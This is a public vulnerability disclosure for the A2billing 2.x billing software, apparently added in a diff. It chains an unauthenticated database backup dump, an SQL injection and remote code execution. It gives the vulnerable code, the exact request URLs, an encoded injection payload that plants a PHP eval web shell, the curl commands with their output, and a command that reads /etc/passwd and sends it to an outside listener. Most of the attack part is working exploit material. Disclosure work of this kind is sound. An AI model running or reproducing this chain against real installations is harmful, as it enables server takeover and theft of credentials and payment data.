@@ -1,0 +1,110 @@
+# Title : A2billing 2.x , Unauthenticated Backup dump / RCE flaw
+# Vulnerable software : A2billing 2.x
+# Author : Ahmed Sultan (0x4148)
+# Email : 0x4148@gmail.com
+# Home : 0x4148.com
+# Linkedin : https://www.linkedin.com/in/0x4148/
+
+A2billing contain multiple flaws which can be chained together to achieve shell access over the a2b instance
+
+If you're looking for deep technical stuff , check out the full writeup at https://0x4148.com/2016/10/28/a2billing-rce/
+
+1 . backup dump
+Vulnerable code
+File : admin/public/form_data/FG_var_backup.inc
+getpost_ifset(array('name','path','creationdate'));
+
+$HD_Form = new FormHandler("cc_backup","Backup");
+
+$HD_Form -> FG_DEBUG = 0;
+
+if ($form_action!='ask-add')
+check_demo_mode();
+
+if ($form_action == 'add'){
+$backup_file = $path;
+
+if (substr($backup_file,-3)=='.gz'){
+// WE NEED TO GZIP
+$backup_file = substr($backup_file,0,-3);
+$do_gzip=1;
+}
+// Make the backup stuff here and redirect to success page
+//mysqldump -all --databases mya2billing -ua2billinguser
+-pa2billing > /tmp/test.sql
+//pg_dump -c -d -U a2billinguser -h localhost -f /tmp/test.sql
+mya2billing
+
+if (DB_TYPE != 'postgres'){
+$run_backup=MYSQLDUMP." -all --databases ".DBNAME." -u'".USER."'
+-p'".PASS."' > '{$backup_file}'";
+}else{
+$env_var="PGPASSWORD='".PASS."'";
+putenv($env_var);
+$run_backup=PG_DUMP." -c -d -U ".USER." -h ".HOST." -f '{$backup_file}'
+".DBNAME;
+}
+if ($FG_DEBUG == 1 ) echo $run_backup."<br>";
+>>>> exec($run_backup,$output,$error);
+if ($do_gzip){
+// Compress file
+$run_gzip = GZIP_EXE." '$backup_file'";
+if ($FG_DEBUG == 1 ) echo $run_gzip."<br>";
+>>>> exec($run_gzip,$output,$error_zip);
+}
+
+File is being called at "admin/Public/A2B_entity_backup.php" before the authentication checking proccess take place so to dump full backup we can just move to :
+http://HOST//a2billing/admin/Public/A2B_entity_backup.php?form_action=add&path=0x4148.sql
+backup will be found at admin/Public/0x4148.sql
+
+few hardening is being carried out by the application which did great job preventing direct RCE flaw , so we had to figure out sth else
+
+2 . SQL injection
+File name : ckeckout_process.php
+Line 287 : $Query = "INSERT INTO cc_payments_agent ( agent_id, agent_name,
+agent_email_address, item_name, item_id, item_quantity, payment_method,
+cc_type, cc_owner, cc_number, " .
+" cc_expires, orders_status, last_modified, date_purchased,
+orders_date_finished, orders_amount, currency, currency_value) values (" .
+" '".$transaction_data[0][1]."', '".$customer_info[3]."
+".$customer_info[2]."', '".$customer_info["email"]."', 'balance', '".
+$customer_info[0]."', 1, '$pmodule',
+'".$_SESSION["p_cardtype"]."', '".$transaction_data[0][5]."',
+'".$transaction_data[0][6]."', '".
+$transaction_data[0][7]."', $orderStatus, '".$nowDate."',
+'".$nowDate."', '".$nowDate."', ".$amount_paid.", '".$currCurrency."', '".
+$currencyObject->get_value($currCurrency)."' )";
+$result = $DBHandle_max -> Execute($Query);
+
+By exploiting this flaw we can insert malicious data into the db using the following query <thanks to i-Hmx for the great hint>
+transactionID=456789111111 unise//**lecton selinse//**rtect
+1,2,3,4,0x706c75676e706179,0x3c3f706870206576616c286261736536345f6465636f646528245f504f53545b6e61696c69745d29293b203f3e,7,8,9,10,11,12,13-//**-
+-&sess_id=4148&key=98346a2b29c131c78dc89b50894176eb
+After sending this request the following payload "<?php
+eval(base64_decode($_POST[nailit])); ?>" will be injected directly into the
+DB
+
+3 . RCE
+after injecting the malicious code we can just dump backup again but this time we will name it "0x4148.php" , so our code can be executed :)
+
+[root@localhost Public]# curl '
+https://127.0.0.1/a2billing/admin/Public/A2B_entity_backup.php?form_action=add&path=0x4148.php' --insecure
+[root@localhost Public]# cat 0x4148.php | grep nailit
+INSERT INTO `cc_payments_agent` VALUES (295,2,'
+','','balance','',1,'plugnpay','','66666666666666666666666666666666666666666666','77777777777777777777777777777777','8',-1,'3.000000','2016-10-28
+10:57:10','2016-10-28 10:57:10','2016-10-28
+10:57:10','usd','0.000000'),(296,2,'
+','','balance','',1,'plugnpay','','<?php
+eval(base64_decode($_POST[nailit])); ?>','7','8',-1,'3.000000','2016-10-28
+10:58:22','2016-10-28 10:58:22','2016-10-28 10:58:22','usd','0.000000');
+
+Now just exploit it via post nailit=base64_encoded php code to admin/Public/0x4148.php for instance system(‘x=$(cat /etc/passwd);curl -d “$x”
+http://x.x.x.x:8000/0x4148.jnk’); will read /etc/passwd and send it to our nc listener
+
+Exploit timeline :
+01/10/2016 : vulnerability reported to vendor
+06/10/2016 - 12/2016 : talks talks talks with promises of fixing ASAP
+04/09/2017 : Public release
+
+Credits,
+Ahmed Sultan - Cyber Security Analyst @ EG-CERT
